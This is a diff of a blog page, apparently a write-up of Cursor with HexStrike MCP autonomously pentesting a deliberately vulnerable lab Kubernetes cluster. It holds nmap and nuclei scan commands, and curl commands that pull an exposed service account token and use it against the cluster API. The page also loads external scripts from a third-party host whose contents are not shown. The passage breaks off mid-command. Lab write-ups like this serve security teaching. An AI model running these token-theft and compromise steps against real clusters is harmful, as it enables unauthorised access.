@@ -13,8 +13,8 @@
 <script src="https://1200km.com/assets/theme-bootstrap.js"></script>
 <script src="https://1200km.com/assets/docusaurus-ecosystem.js?v=20260614-3" defer="defer"></script>
 <script src="https://1200km.com/assets/site-theme.js?v=20260721-shell" defer="defer"></script><link rel="stylesheet" href="/medium-blog-navigation/assets/css/styles.c1e57449.css">
-<script src="/medium-blog-navigation/assets/js/runtime~main.ab5f91ad.js" defer="defer"></script>
-<script src="/medium-blog-navigation/assets/js/main.7e23fde8.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/runtime~main.8d79bc55.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/main.4b84d819.js" defer="defer"></script>
 <meta name="robots" content="noindex,follow">
 </head>
 <body>
@@ -35,7 +35,7 @@
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-cursor--hexstrike-mcp-automatically-discovers-and-exploits-vulnerabilities-from-single-entry-point-to-full-cluster-compromise">How Cursor + HexStrike MCP Automatically Discovers and Exploits Vulnerabilities. From single entry point to full cluster compromise<a href="#how-cursor--hexstrike-mcp-automatically-discovers-and-exploits-vulnerabilities-from-single-entry-point-to-full-cluster-compromise" class="hash-link" aria-label="Direct link to How Cursor + HexStrike MCP Automatically Discovers and Exploits Vulnerabilities. From single entry point to full cluster compromise" title="Direct link to How Cursor + HexStrike MCP Automatically Discovers and Exploits Vulnerabilities. From single entry point to full cluster compromise" translate="no">​</a></h3>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="executive-summary">Executive Summary<a href="#executive-summary" class="hash-link" aria-label="Direct link to Executive Summary" title="Direct link to Executive Summary" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-power-of-one-prompt">The Power of One Prompt<a href="#the-power-of-one-prompt" class="hash-link" aria-label="Direct link to The Power of One Prompt" title="Direct link to The Power of One Prompt" translate="no">​</a></h3>
-<p>This article demonstrates how<strong>a single prompt</strong>to an AI assistant (Cursor) with HexStrike MCP integration can automatically perform a<strong>complete black-box penetration test</strong>on a Kubernetes cluster. The AI:</p>
+<p>This article demonstrates how <strong>a single prompt</strong> to an AI assistant (Cursor) with HexStrike MCP integration can automatically perform a <strong>complete black-box penetration test</strong> on a Kubernetes cluster. The AI:</p>
 <ul>
 <li class="">
 <p>Discovers all vulnerabilities from zero knowledge</p>
@@ -56,7 +56,7 @@
 <p>Documents everything with proof</p>
 </li>
 </ul>
-<p><strong>Key Achievement</strong>: From one prompt to full cluster compromise in<strong>6 minutes 40 seconds</strong>.</p>
+<p><strong>Key Achievement</strong>: From one prompt to full cluster compromise in <strong>6 minutes 40 seconds</strong>.</p>
 <p><strong>Lab:</strong></p>
 <p>[<strong>Building a Vulnerable Kubernetes Lab: A Complete Guide to 25 Critical Security Issues</strong>
 <a class="" href="/medium-blog-navigation/docs/articles/2026/2026-02-02-building-a-vulnerable-kubernetes-lab-a-complete-guide-to-25-critical-security-issues-fae4fc8e3a91">Learn Kubernetes security by building a comprehensive penetration testing lab with 25 real-world vulnerabilities</a></p>
@@ -93,9 +93,9 @@
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-single-prompt">The Single Prompt<a href="#the-single-prompt" class="hash-link" aria-label="Direct link to The Single Prompt" title="Direct link to The Single Prompt" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-initial-request">The Initial Request<a href="#the-initial-request" class="hash-link" aria-label="Direct link to The Initial Request" title="Direct link to The Initial Request" translate="no">​</a></h3>
 <p><strong>User Prompt to Cursor AI</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Perform </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">a</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> comprehensive black-box penetration test on the Kubernetes cluster at </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">I</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> have zero knowledge about this target. Use HexStrike MCP tools and find MULTIPLE ways </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">discover and exploit each vulnerability. Start </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">from</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">a</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> single entry point and work your way </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> full cluster compromise. Document </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">all</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> reasoning, tool usage, and troubleshooting steps.</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Perform a comprehensive black-box penetration test on the Kubernetes cluster at 192.168.49.2. </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">I have zero knowledge about this target. Use HexStrike MCP tools and find MULTIPLE ways to </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">discover and exploit each vulnerability. Start from a single entry point and work your way </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to full cluster compromise. Document all reasoning, tool usage, and troubleshooting steps.</span><br></div></code></pre></div></div>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="ai-initial-analysis">AI Initial Analysis<a href="#ai-initial-analysis" class="hash-link" aria-label="Direct link to AI Initial Analysis" title="Direct link to AI Initial Analysis" translate="no">​</a></h2>
-<p><strong>AI Reasoning</strong>(internal thought process):</p>
+<p><strong>AI Reasoning</strong> (internal thought process):</p>
 <p>&gt; “The user wants a black-box penetration test with zero prior knowledge. Key requirements:</p>
 <ul>
 <li class="">
@@ -145,13 +145,13 @@
 <p>&gt; “I need to discover all open ports. I have several options:</p>
 <ul>
 <li class="">
-<p><strong>nmap</strong>— Industry standard, comprehensive</p>
+<p><strong>nmap</strong> — Industry standard, comprehensive</p>
 </li>
 <li class="">
-<p><strong>rustscan</strong>— Faster but less detailed</p>
+<p><strong>rustscan</strong> — Faster but less detailed</p>
 </li>
 <li class="">
-<p><strong>masscan</strong>— Very fast but less accurate</p>
+<p><strong>masscan</strong> — Very fast but less accurate</p>
 </li>
 </ul>
 <p>&gt; For black-box testing, I need accuracy over speed. I’ll use nmap with multiple scan types:</p>
@@ -171,7 +171,7 @@
 </ul>
 <p>&gt; This gives me comprehensive coverage.”</p>
 <p><strong>AI Tool Selection</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Use nmap with multiple scan types</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Need comprehensive port discovery for black-box testing</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Scan 1: Full TCP port scan</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sV -sC -O -p- --min-rate</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1000</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Scan 2: Service version detection on specific ports</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -p </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30080</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30081</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30082</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30443</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">8443</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">10250</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2379</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Scan 3: Vulnerability scripts</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap --script vuln,exploit,auth,default -p </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30080</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30081</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30082</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">8443</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Scan 4: UDP scan</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sU --top-ports</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">100</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">49.2</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Use nmap with multiple scan types</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Need comprehensive port discovery for black-box testing</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Scan 1: Full TCP port scan</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sS -sV -sC -O -p- --min-rate=1000 192.168.49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Scan 2: Service version detection on specific ports</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -p 30080,30081,30082,30443,8443,10250,2379 192.168.49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Scan 3: Vulnerability scripts</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap --script vuln,exploit,auth,default -p 30080,30081,30082,8443 192.168.49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Scan 4: UDP scan</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sU --top-ports=100 192.168.49.2</span><br></div></code></pre></div></div>
 <p><strong>Result</strong>: AI discovers 4 HTTP services (ports 30080, 30081, 30082, 30443) and Kubernetes API (8443).</p>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “Found 4 HTTP services and Kubernetes API. These are potential entry points. I should:</p>
@@ -212,27 +212,27 @@
 <p>&gt; “I found 3 HTTP services. I need to understand what each does. I’ll use multiple tools:</p>
 <ul>
 <li class="">
-<p><strong>httpx</strong>— Fast HTTP probing with technology detection</p>
+<p><strong>httpx</strong> — Fast HTTP probing with technology detection</p>
 </li>
 <li class="">
-<p><strong>curl</strong>— Manual testing for specific endpoints</p>
+<p><strong>curl</strong> — Manual testing for specific endpoints</p>
 </li>
 <li class="">
-<p><strong>nuclei</strong>— Automated vulnerability scanning</p>
+<p><strong>nuclei</strong> — Automated vulnerability scanning</p>
 </li>
 </ul>
 <p>&gt; Using multiple tools ensures I don’t miss anything.”</p>
 <p><strong>AI Tool Usage</strong>:</p>
 <p><strong>Tool 1: httpx — Comprehensive Probing</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Use httpx for initial service discovery</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Fast, provides technology detection, title extraction</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">httpx -u http:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30080</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -title -status-code -tech-detect -content-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">length</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -server \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -json -silent</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Use httpx for initial service discovery</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Fast, provides technology detection, title extraction</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">httpx -u http://192.168.49.2:30080 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -title -status-code -tech-detect -content-length -server \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -json -silent</span><br></div></code></pre></div></div>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “Port 30080: Python/Werkzeug application. This is likely vulnerable to injection attacks. I should test for SQL injection and command injection.”</p>
 <p><strong>Tool 2: nuclei — Vulnerability Scanning</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Run nuclei in parallel</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Automated vulnerability detection </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">while</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> I </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> manual testing</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nuclei -u http:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//192.168.49.2:30080 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -severity critical,high,medium \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -silent -json</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Run nuclei in parallel</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Automated vulnerability detection while I do manual testing</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nuclei -u http://192.168.49.2:30080 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -severity critical,high,medium \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -silent -json</span><br></div></code></pre></div></div>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “nuclei is running. While it scans, I’ll manually test endpoints.”</p>
 <p><strong>Tool 3: Manual API Testing</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Test common API endpoints manually</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Automated tools might miss custom endpoints</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> endpoint </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> /api /api/token /api/execute /api/users /api/health; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s -o /dev/null -w </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;%{http_code}&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;http://192.168.49.2:30082</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$endpoint</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Test common API endpoints manually</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Automated tools might miss custom endpoints</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for endpoint in /api /api/token /api/execute /api/users /api/health; do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s -o /dev/null -w &quot;%{http_code}&quot; &quot;http://192.168.49.2:30082$endpoint&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
 <p><strong>AI Discovery</strong>:</p>
 <p>&gt; “Found /api/token endpoint on port 30082! This could expose tokens. I need to test this immediately.&quot;</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="stage-2-vulnerability-discovery">Stage 2: Vulnerability Discovery<a href="#stage-2-vulnerability-discovery" class="hash-link" aria-label="Direct link to Stage 2: Vulnerability Discovery" title="Direct link to Stage 2: Vulnerability Discovery" translate="no">​</a></h3>
@@ -257,11 +257,11 @@
 <p><strong>Method 1: Direct API Call</strong></p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Try direct endpoint first</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Simplest approach, might work immediately</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s http://192.168.49.2:30082/api/token</span><br></div></code></pre></div></div>
 <p><strong>Result</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;token&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;eyJhbGciOiJSUzI1NiIs...&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;message&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Service account token exposed!&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;token&quot;: &quot;eyJhbGciOiJSUzI1NiIs...&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;message&quot;: &quot;Service account token exposed!&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “SUCCESS! Token extracted on first try. But I should verify there aren’t other ways to get it, and test if this token works.”</p>
 <p><strong>Method 2: Alternative Paths</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Test alternative paths</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Token might be exposed via other endpoints</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> path </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> /token /api/token /v1/token /api/v1/token /auth/token; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;http://192.168.49.2:30082</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$path</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Test alternative paths</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Token might be exposed via other endpoints</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for path in /token /api/token /v1/token /api/v1/token /auth/token; do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  curl -s &quot;http://192.168.49.2:30082$path&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “Only /api/token works. But I&#x27;ve confirmed there&#x27;s only one way to get it from this service. Now I need to test if the token works with Kubernetes API.&quot;</p>
 <p><strong>Method 3: Response Headers</strong></p>
@@ -284,12 +284,12 @@
 </ul>
 <p>&gt; This will tell me if I have cluster access.”</p>
 <p><strong>AI Actions</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Extract token</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">TOKEN=$(curl -s http://192.168.49.2:30082/api/token | jq -r </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;.token&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Test 1: Basic API access</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -k -s -H </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Authorization: Bearer </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$TOKEN</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  https://192.168.49.2:8443/api/v1/namespaces</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Extract token</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">TOKEN=$(curl -s http://192.168.49.2:30082/api/token | jq -r &#x27;.token&#x27;)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Test 1: Basic API access</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -k -s -H &quot;Authorization: Bearer $TOKEN&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  https://192.168.49.2:8443/api/v1/namespaces</span><br></div></code></pre></div></div>
 <p><strong>AI Analysis</strong>:</p>
 <p>&gt; “API call succeeded! I can access Kubernetes API. Now I need to check permissions.”</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Test 2: Permission check</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -k -s -X POST \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -H </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Authorization: Bearer $TOKEN&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -H </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Content-Type: application/json&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -d &#x27;{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;spec&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:{</span><br></div><div class="token-line" style="color:#393A34"><span class="token 